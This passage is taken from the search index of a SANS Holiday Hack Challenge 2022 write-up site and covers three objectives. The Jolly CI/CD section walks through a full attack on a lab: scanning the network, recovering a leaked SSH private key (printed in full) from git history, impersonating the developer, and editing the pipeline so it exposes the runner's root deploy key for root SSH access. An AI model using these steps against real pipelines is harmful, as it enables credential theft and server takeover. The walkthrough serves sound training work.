at the root of the repository. Examining this file shows that it uses the rsync command to copy files to the web server using ssh authentication for the root user, using the private key file located at /etc/gitlab-runner/hhc22-wordpress-deploy .gitlab-ci.yml stages : - deploy deploy-job : stage : deploy environment : production script : - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html We can pilfer this private key file by adding a line to the pipeline config that will also copy it to the root of the web site. Modified .gitlab-ci.yml stages : - deploy deploy-job : stage : deploy environment : production script : - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/html Now we just need to commit the change, push the commit to the repository, retrieve the private key file, then use it to ssh to the web server. $ git commit -am \"Nothing to see here\" $ git push $ curl wordpress.local_docker_network/hhc22-wordpress-deploy > ~/hhc22-wordpress-deploy $ chmod 600 ~/hhc22-wordpress-deploy $ ssh -i ~/hhc22-wordpress-deploy root@wordpress.flag.net.internal Now that we have root access to the web server, read the contents of the target file cat /flag.txt Answer oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT Completion Talk to Rippin Proudboot How unexpected, you were actually able to help! Well, then I must apoligize for my dubious greeting. Us Flobbits can't help it sometimes, it's just in our nature. Right then, there are other Flobbits that need assistance further into the burrows. Thank you, and off you go.","title":"Jolly CI/CD"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#jolly-cicd","text":"Jolly CI/CD Difficulty : Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring Note that this objective is not available until Prison Escape is completed.","title":"Jolly CI/CD"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#elf-introduction","text":"Talk to Rippin Proudboot Yes, hello, I'm Rippin Proudboot. Can I help you? Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see. The elves here introduced me to this new CI/CD technology. It seems quite efficient. Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring. They've used CI/CD to launch a website, and the Elfen Ring to power it. Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline? If you do find anything, use it to exploit the website, and get the ring back!","title":"Elf Introduction"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#hints-and-resources","text":"Hints from Tinsel Upatree after completing the Prison Escape objective Commiting to Mistakes The thing about Git is that every step of development is accessible \u2013 even steps you didn't mean to take! git log can show code skeletons. Switching Hats If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials. Other resources Rajvi Khanjan Shroff, Xmas Scanning with Nmap | KringleCon 2022 https://www.youtube.com/watch?v=O1vc5yDUeiE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=6&t=8s Jared Folkins, DevOps Faux Paws | KringleCon 2022 https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11 w3m https://w3m.sourceforge.net/MANUAL Git docs https://git-scm.com/docs","title":"Hints and Resources"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#solution","text":"","title":"Solution"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#recon","text":"Before we start, let's first determine our own IP address ifconfig grinchum-land:~$ ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:12:00:63 inet addr:172.18.0.99 Bcast:172.18.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:363 errors:0 dropped:0 overruns:0 frame:0 TX packets:252 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:30667 (29.9 KiB) TX bytes:36653 (35.7 KiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:7 errors:0 dropped:0 overruns:0 frame:0 TX packets:7 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:389 (389.0 B) TX bytes:389 (389.0 B) Now perform an nmap scan of our local network segment nmap -p1-65535 172.18.0.0/24 grinchum-land:~$ nmap -p1-65535 172.18.0.0/24 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-10 22:40 GMT Nmap scan report for 172.18.0.1 Host is up (0.00042s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2222/tcp open EtherNetIP-1 8080/tcp open http-proxy 8088/tcp open radan-http 10022/tcp open unknown Nmap scan report for wordpress-db.local_docker_network (172.18.0.87) Host is up (0.00043s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 3306/tcp open mysql Nmap scan report for wordpress.local_docker_network (172.18.0.88) Host is up (0.00052s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99) Host is up (0.00012s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 2222/tcp open EtherNetIP-1 Nmap scan report for gitlab.local_docker_network (172.18.0.150) Host is up (0.00012s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8181/tcp open intermapper Nmap done: 256 IP addresses (5 hosts up) scanned in 10.99 seconds","title":"Recon"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#get-the-code","text":"Presumably the code is stored on the gitlab server, and a CI/CD pipeline copies it to the wordpress site when changes are made. In order to get a copy of the code to investigate, further, we first need to find it. Use w3m to connect to the site w3m gitlab.local_docker_network GitLab Logo GitLab Username or email [ ] Password [ ] [ ] Remember me Forgot your password? Sign in By signing in you accept the Terms of Use and acknowledge the Privacy Policy and Cookie Policy. Don't have an account yet? Register now \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Explore Help About GitLab Community forum Follow the Explore link Skip to content GitLab \u2022 Projects Groups Snippets \u2022 [ ] / \u2022 \u2022 Help \u25a1 Help \u25a1 Support \u25a1 Community forum \u25a1 Keyboard shortcuts ? \u25a1 \u25a1 Submit feedback \u25a1 Contribute to GitLab \u2022 Sign in / Register Toggle navigation Menu Explore GitLab Discover projects, groups and snippets. Share your projects with others \u2022 All \u2022 Most stars \u2022 Trending [ ] Updated date \u2022 Sort by \u2022 Updated date \u2022 Last created \u2022 Name \u2022 Name, descending \u2022 Most stars \u2022 Oldest updated \u2022 Oldest created \u2022 \u2022 Hide archived projects \u2022 Show archived projects \u2022 Show archived projects only \u2022 W Rings of Powder / Wordpress.Flag.Net.Internal 0 0 0 0 Updated Oct 27, 2022 Follow the Rings of Powder link At the bottom of the page are references to the SSH and HTTP links to the repository Copy HTTP clone URL \u2022 Copy SSH clone URLssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git \u2022 Copy HTTP clone URLhttp://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Clone the repo using the http link $ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git","title":"Get the Code"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#examine-the-commit-history","text":"Now that we have a copy of the repository, search the commit history for anything interesting. $ cd wordpress.flag.net.internal $ git log commit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD) Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 13:58:15 2022 -0700 updated wp-config commit a59cfe83522c9aeff80d49a0be2226f4799ed239 Author: knee-oh <sporx@kringlecon.com> Date: Wed Oct 26 12:41:05 2022 -0700 update gitlab.ci.yml commit a968d32c0b58fd64744f8698cbdb60a97ec604ed Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 16:43:48 2022 -0700 test commit 7093aad279fc4b57f13884cf162f7d80f744eea5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 15:08:14 2022 -0700 add gitlab-ci commit e2208e4bae4d41d939ef21885f13ea8286b24f05 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:43:53 2022 -0700 big update commit e19f653bde9ea3de6af21a587e41e7a909db1ca5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:54 2022 -0700 whoops commit abdea0ebb21b156c01f7533cea3b895c26198c98 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:13 2022 -0700 added assets commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca Author: knee-oh <sporx@kringlecon.com> Date: Mon Oct 24 17:32:07 2022 -0700 init commit Any commit with the name 'whoops' requires further investigation $ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5 commit e19f653bde9ea3de6af21a587e41e7a909db1ca5 Author: knee-oh <sporx@kringlecon.com> Date: Tue Oct 25 13:42:54 2022 -0700 whoops diff --git a/.ssh/.deploy b/.ssh/.deploy deleted file mode 100644 index 3f7a9e3..0000000 --- a/.ssh/.deploy +++ /dev/null @@ -1,7 +0,0 @@ ------BEGIN OPENSSH PRIVATE KEY----- -b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW -QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 -9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g -AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot -PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== ------END OPENSSH PRIVATE KEY----- diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub deleted file mode 100644 index 8c0b43c..0000000 --- a/.ssh/.deploy.pub +++ /dev/null @@ -1 +0,0 @@ -ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com In this commit we see that the developer removed a public key that had been inadvertently included.","title":"Examine the commit history"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#impersonate-knee-oh","text":"From the content of the public key in the git commit history we see that this is an ed25519 key. Copy this content into our own key file, remembering to remove the leading - from each line out of the commit history. $ cd ~ $ mkdir .ssh $ nano .ssh/id_ed25519 <paste the contents of the private key> $ chmod 600 .ssh/id_ed25519 Before we can re-clone the repository, we need to also set our username and email properties in git to impersonate knee-oh $ git config --global user.email \"sporx@kringlecon.com\" $ git config --global user.name \"knee-oh\" Now we need to re-clone the repository using ssh. Looking back at the ssh URL we see that it is ssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git , but referring back to the nmap scan there is no port 10022 listening on the gitlab server. There is however a port 10022 listening on the machine at IP address 172.18.0.1, so try that instead. $ cd ~ $ rm -rf wordpress.flag.net.internal $ git clone ssh://git@172.18.0.1:10022/rings-of-powder/wordpress.flag.net.internal.git Now that we have connected as an authenticated user, we can commit and push changes back to the repo.","title":"Impersonate knee-oh"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#exploit-the-cicd-pipline","text":"The CI/CD pipeline is defined by the .gitlab-ci.yml file at the root of the repository. Examining this file shows that it uses the rsync command to copy files to the web server using ssh authentication for the root user, using the private key file located at /etc/gitlab-runner/hhc22-wordpress-deploy .gitlab-ci.yml stages : - deploy deploy-job : stage : deploy environment : production script : - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html We can pilfer this private key file by adding a line to the pipeline config that will also copy it to the root of the web site. Modified .gitlab-ci.yml stages : - deploy deploy-job : stage : deploy environment : production script : - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/html Now we just need to commit the change, push the commit to the repository, retrieve the private key file, then use it to ssh to the web server. $ git commit -am \"Nothing to see here\" $ git push $ curl wordpress.local_docker_network/hhc22-wordpress-deploy > ~/hhc22-wordpress-deploy $ chmod 600 ~/hhc22-wordpress-deploy $ ssh -i ~/hhc22-wordpress-deploy root@wordpress.flag.net.internal Now that we have root access to the web server, read the contents of the target file cat /flag.txt Answer oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT","title":"Exploit the CI/CD pipline"},{"location":"quests/Recover_the_Elfen_Ring/07_Jolly_CICD/#completion","text":"Talk to Rippin Proudboot How unexpected, you were actually able to help! Well, then I must apoligize for my dubious greeting. Us Flobbits can't help it sometimes, it's just in our nature. Right then, there are other Flobbits that need assistance further into the burrows. Thank you, and off you go.","title":"Completion"},{"location":"quests/Recover_the_Tolkien_Ring/","text":"Recover the Tolkien Ring This quest line takes place on the second level of the subterranean labyrinth (down the second ladder) and consists of 3 objectives. Wireshark Practice Windows Event Logs Suricata Regatta","title":"Recover the Tolkien Ring"},{"location":"quests/Recover_the_Tolkien_Ring/#recover-the-tolkien-ring","text":"This quest line takes place on the second level of the subterranean labyrinth (down the second ladder) and consists of 3 objectives. Wireshark Practice Windows Event Logs Suricata Regatta","title":"Recover the Tolkien Ring"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/","text":"Wireshark Practice Wireshark Practice Difficulty : Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysterires around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal. Elf Introduction Talk to Sparkle Redberry Hey there! I\u2019m Sparkle Redberry. We have a bit of an incident here. We were baking lembanh in preparation for the holidays. It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall! We're trying to investigate what caused this, so we can make it go away. Have you used Wireshark to look at packet capture (PCAP) files before? I've got a PCAP you might find interesting. Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane. Thanks for helping us get to the bottom of this! Hints and Resources Hints from the terminal Wireshark Filters https://wiki.wireshark.org/DisplayFilters tshark Filters https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/ Misc SANS Cheatsheets https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/ Other resources SSL Country Codes https://www.ssl.com/country-codes/ Wireshark https://www.wireshark.org/#download Solution Open the terminal next to Sparkle Redberry and answer the questions. This challenge can be completed either by downloading the provided PCAP file to your local computer and opening it with Wireshark, or by using tshark on the in-game terminal. That said, my tshark skills are very weak, so I used Wireshark exclusively for this objective. Question 1. There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP? Wireshark can export several types of objects using the File > Export Objects menu. To complete this objective simply pick each of the object types available and identify the one that has objects available to export. Answer http Question 2. What is the file name of the largest file we can export? From the File > Export Objects > HTTP window, look for the filename with the largest size Answer app.php Question 3. What packet number starts that app.php file? From the same window used in the previous question, find the starting packet of the largest file Answer 687 Question 4. What is the IP of the Apache server? From the same window used in the previous two questions we see that the name of the server the objects came from is adv.apostoday.uk. Conveniently enough, the first two packets in the capture file is a DNS request for adv.epostoday.uk and the reply. Had this not been so obvious, we could have used the following filter to show just what we were interested in dns.qry.name == adv.epostoday.uk Answer 192.185.57.242 Question 5. What file is saved to the infected host? From the File > Export Objects > HTTP screen, export the app.php file and open it locally. At the very end of the file is a function named saveAs that specifies the name of the file that will be created when the file executes. Answer Ref_Sept24-2020.zip Question 6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea). To limit our view of the capture to just TLS certificates use the following filter tls.handshake.certificate This results in 20 packets to inspect. For each packet, inspect the packet details and expand TLS > TLS Record Layer > Handshake Protocol: Certificate > Certificates > Certificate. Most of the certificates in the capture refer to Microsoft, but several more suspect common names are also present. heardbellith.Icanwepeh.nagoya - Packet 808 psprponounst.aquarelle - Packets 3903, 3922, 4747, 5158 Expanding those records further we find that the issuer countryName value for the first one is IL, and SS for the second. Referring to the list of SSL country codes at https://www.ssl.com/country-codes/ we find the names of these countries. Answer Israel, South Sudan Question 7. Is the host infected (Yes/No)? From the exportable objects we see that the file app.php was downloaded twice, once as a 754 byte file, and the second time as a 808 kB file. Exporting both and inspecting them shows that the second one has appended code that will create the file Ref_Sep24-2020.zip. Further inspection of this zip file reveals that it contains a single .scr file, which when analyzed by Windows Defender or Virus Total indicates that it is the Dridex banking trojan. Answer yes Completion Talk to Sparkle Redberry to recieve hints for the next objective You got it - wonderful! So hey, when you're looking at the next terminal, remember you have multiple filetypes and tools you can utilize. Conveniently for us, we can use programs already installed on every Windows computer. So if you brought your own Windows machine, you can save the files to it and use whatever method is your favorite. Oh yeah! If you wanna learn more, or get stuck, I hear Eric Pursley's talk is about this very topic.","title":"Wireshark Practice"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/#wireshark-practice","text":"Wireshark Practice Difficulty : Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysterires around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal.","title":"Wireshark Practice"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/#elf-introduction","text":"Talk to Sparkle Redberry Hey there! I\u2019m Sparkle Redberry. We have a bit of an incident here. We were baking lembanh in preparation for the holidays. It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall! We're trying to investigate what caused this, so we can make it go away. Have you used Wireshark to look at packet capture (PCAP) files before? I've got a PCAP you might find interesting. Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane. Thanks for helping us get to the bottom of this!","title":"Elf Introduction"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/#hints-and-resources","text":"Hints from the terminal Wireshark Filters https://wiki.wireshark.org/DisplayFilters tshark Filters https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/ Misc SANS Cheatsheets https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/ Other resources SSL Country Codes https://www.ssl.com/country-codes/ Wireshark https://www.wireshark.org/#download","title":"Hints and Resources"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/#solution","text":"Open the terminal next to Sparkle Redberry and answer the questions. This challenge can be completed either by downloading the provided PCAP file to your local computer and opening it with Wireshark, or by using tshark on the in-game terminal. That said, my tshark skills are very weak, so I used Wireshark exclusively for this objective. Question 1. There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP? Wireshark can export several types of objects using the File > Export Objects menu. To complete this objective simply pick each of the object types available and identify the one that has objects available to export. Answer http Question 2. What is the file name of the largest file we can export? From the File > Export Objects > HTTP window, look for the filename with the largest size Answer app.php Question 3. What packet number starts that app.php file? From the same window used in the previous question, find the starting packet of the largest file Answer 687 Question 4. What is the IP of the Apache server? From the same window used in the previous two questions we see that the name of the server the objects came from is adv.apostoday.uk. Conveniently enough, the first two packets in the capture file is a DNS request for adv.epostoday.uk and the reply. Had this not been so obvious, we could have used the following filter to show just what we were interested in dns.qry.name == adv.epostoday.uk Answer 192.185.57.242 Question 5. What file is saved to the infected host? From the File > Export Objects > HTTP screen, export the app.php file and open it locally. At the very end of the file is a function named saveAs that specifies the name of the file that will be created when the file executes. Answer Ref_Sept24-2020.zip Question 6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea). To limit our view of the capture to just TLS certificates use the following filter tls.handshake.certificate This results in 20 packets to inspect. For each packet, inspect the packet details and expand TLS > TLS Record Layer > Handshake Protocol: Certificate > Certificates > Certificate. Most of the certificates in the capture refer to Microsoft, but several more suspect common names are also present. heardbellith.Icanwepeh.nagoya - Packet 808 psprponounst.aquarelle - Packets 3903, 3922, 4747, 5158 Expanding those records further we find that the issuer countryName value for the first one is IL, and SS for the second. Referring to the list of SSL country codes at https://www.ssl.com/country-codes/ we find the names of these countries. Answer Israel, South Sudan Question 7. Is the host infected (Yes/No)? From the exportable objects we see that the file app.php was downloaded twice, once as a 754 byte file, and the second time as a 808 kB file. Exporting both and inspecting them shows that the second one has appended code that will create the file Ref_Sep24-2020.zip. Further inspection of this zip file reveals that it contains a single .scr file, which when analyzed by Windows Defender or Virus Total indicates that it is the Dridex banking trojan. Answer yes","title":"Solution"},{"location":"quests/Recover_the_Tolkien_Ring/02_Wireshark_Practice/#completion","text":"Talk to Sparkle Redberry to recieve hints for the next objective You got it - wonderful! So hey, when you're looking at the next terminal, remember you have multiple filetypes and tools you can utilize. Conveniently for us, we can use programs already installed on every Windows computer. So if you brought your own Windows machine, you can save the files to it and use whatever method is your favorite. Oh yeah! If you wanna learn more, or get stuck, I hear Eric Pursley's talk is about this very topic.","title":"Completion"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/","text":"Windows Event Logs Windows Event Logs Difficulty : Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal. Elf Introduction Talk to Dusty Giftwrap Hi! I'm Dusty Giftwrap! We think the Snowrog was attracted to the pungent smell from the baking lembanh. I'm trying to discover which ingredient could be causing such a stench. I think the answer may be in these suspicious logs. I'm focusing on Windows Powershell logs. Do you have much experience there? You can work on this offline or try it in this terminal. Golly, I'd appreciate it if you could take a look. Hints and Resources Hints from Sparkle Redberry after completion of the Wireshark Practice objective Eric Pursley's Talk https://youtu.be/5NZeHYPMXAE Hints from the terminal grep command https://linuxcommand.org/lc3_man_pages/grep1.html Other resources Eric Pursley, Log Analyzing off the Land | KringleCon 2022 https://www.youtube.com/watch?v=5NZeHYPMXAE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=2&t=6s Solution Open the terminal next to Dusty Giftwrap and answer the questions. For this objective you can either download the event log from https://storage.googleapis.com/hhc22_player_assets/powershell.evtx to a Windows computer and open it with the Windows Event Log application, or use grep with the text formatted version of the event log on the terminal. For the purposes of this investigation, there are two Windows Event Log IDs that are relevant. Event 4104 lists commands that are being submitted for processing by PowerShell. Event 4103 displays the execution of those commands. While it's not strictly necessary to include event 4103, these can be helpful during our investigation by providing us the results of the commands executed (for example, the contents of a directory after the command 'ls' is used). Setup the Windows Event Viewer by opening the log file and setting up a filter to include only event IDs 4103 and 4104. It is also important to remember that when using the text formatted version the records are stored in reverse time order. Question 1: What month/day/year did the attack take place? For example, 09/05/2021. For this question both Event Viewer and grep are equally effective. Event Viewer grep As we are looking for log entries related to the Lembanh recipe, use the Find action to locate records containing the word 'recipe'. Search the text file for lines containing the word 'recipe'. Since lines are not individually time stamped include a few lines before the one with the matching value to get time stamp records. grep -i recipe powershell.evtx.log -B 3 | more Answer 12/24/2022 Question 2. An attacker got a secret from a file. What was the original file's name? For this question Event Viewer is far simpler than grep. Event Viewer grep Presumably the secret ingredient is labeled as such, so use the Find action to locate records containing the word 'secret'. An event that lists the contents of the recipe file is found at 12/24/2022 03:01:03. Look a few records prior to that one for the remote command that displayed the file. Not advisable Answer Recipe Question 3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. Event Viewer grep Use the Find action to locate records containing the word 'Recipe'. Look through them until we find commands that assign a value to a variable, in this case, $foo. Now that we have the variable name, use Find to locate records that assign this variable (use the string '$foo ='), and locate the last one. Use the following command to find records including the word 'Recipe' grep Recipe powershell.evtx.log This will show that the varialbe being assigned is $foo. Use the following command to show all records that assign a value to this variable. grep '^$foo =' powershell.evtx.log Remember that this file is in reverse time order. Answer $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} Question 4. After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action. The most common way for PowerShell to write content to a file is with either the Out-File, Add-Content, or Set-Content commands, so search the log for instances where one of these commands are used with the variable. Event Viewer grep Modify the Find action to search just for '$foo' (since we are looking for any use of this variable). Find the last instance where this variable is used with one of the commands to write content to a file. Use the following grep command to display all uses of the variable $foo, and look for the first record (remember that they are in reverse time order) in the output that uses a PowerShell command to write to a file. grep '$foo' powershell.evtx.log Answer $foo | Add-Content -Path 'Recipe' Question 5. The attacker ran the previous command against a file multiple times. What is the name of this file? Event Viewer grep Use the Find action to search for the following string and make note of each file name written to and the number of times it was. $foo | Add-Content -Path Use the following grep command and examine the output for the file written to the most times. grep '$foo | Add-Content -Path' powershell.evtx.log Answer Recipe.txt Question 6. Were any files deleted? (Yes/No) Event Viewer grep Modify the filter being used to only show event ID 4104, then use the Find action to search for any instance of the following string. del Use the following grep command to see if there are any instances where the delete command is used grep '^del' powershell.evtx.log Answer yes Question 7. Was the original file (from question 2) deleted? (Yes/No) The result of the previous question will answer this one as well. Answer no Question 8. What is the Event ID of the log that shows the actual command line used to delete the file? Event Viewer grep If we've been using Event Viewer then we've been using this event ID throughout the objective. Modify the grep command used to determine if a file was deleted to show the preceding line, one of which will have the event ID. grep '^del' -B 1 powershell.evtx.log Answer 4104 Question 9. Is the secret ingredient compromised (Yes/No)? Refer to the answer to Question 3 Answer yes Question 10. What is the secret ingredient? Refer to the answer to Question 3 Answer honey Completion Talk to Dusty Giftwrap to receive hints for the next objective Say, you did it! Thanks a million! Now we can mix in the proper ingredients and stop attracting the Snowrog! I'm all set now! Can you help Fitzy over there wield the exalted Suricata? It can be a bit mystifying at first, but this Suricata Tome should help you fathom it. I sure hope you can make it work!","title":"Windows Event Logs"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/#windows-event-logs","text":"Windows Event Logs Difficulty : Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal.","title":"Windows Event Logs"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/#elf-introduction","text":"Talk to Dusty Giftwrap Hi! I'm Dusty Giftwrap! We think the Snowrog was attracted to the pungent smell from the baking lembanh. I'm trying to discover which ingredient could be causing such a stench. I think the answer may be in these suspicious logs. I'm focusing on Windows Powershell logs. Do you have much experience there? You can work on this offline or try it in this terminal. Golly, I'd appreciate it if you could take a look.","title":"Elf Introduction"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/#hints-and-resources","text":"Hints from Sparkle Redberry after completion of the Wireshark Practice objective Eric Pursley's Talk https://youtu.be/5NZeHYPMXAE Hints from the terminal grep command https://linuxcommand.org/lc3_man_pages/grep1.html Other resources Eric Pursley, Log Analyzing off the Land | KringleCon 2022 https://www.youtube.com/watch?v=5NZeHYPMXAE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=2&t=6s","title":"Hints and Resources"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/#solution","text":"Open the terminal next to Dusty Giftwrap and answer the questions. For this objective you can either download the event log from https://storage.googleapis.com/hhc22_player_assets/powershell.evtx to a Windows computer and open it with the Windows Event Log application, or use grep with the text formatted version of the event log on the terminal. For the purposes of this investigation, there are two Windows Event Log IDs that are relevant. Event 4104 lists commands that are being submitted for processing by PowerShell. Event 4103 displays the execution of those commands. While it's not strictly necessary to include event 4103, these can be helpful during our investigation by providing us the results of the commands executed (for example, the contents of a directory after the command 'ls' is used). Setup the Windows Event Viewer by opening the log file and setting up a filter to include only event IDs 4103 and 4104. It is also important to remember that when using the text formatted version the records are stored in reverse time order. Question 1: What month/day/year did the attack take place? For example, 09/05/2021. For this question both Event Viewer and grep are equally effective. Event Viewer grep As we are looking for log entries related to the Lembanh recipe, use the Find action to locate records containing the word 'recipe'. Search the text file for lines containing the word 'recipe'. Since lines are not individually time stamped include a few lines before the one with the matching value to get time stamp records. grep -i recipe powershell.evtx.log -B 3 | more Answer 12/24/2022 Question 2. An attacker got a secret from a file. What was the original file's name? For this question Event Viewer is far simpler than grep. Event Viewer grep Presumably the secret ingredient is labeled as such, so use the Find action to locate records containing the word 'secret'. An event that lists the contents of the recipe file is found at 12/24/2022 03:01:03. Look a few records prior to that one for the remote command that displayed the file. Not advisable Answer 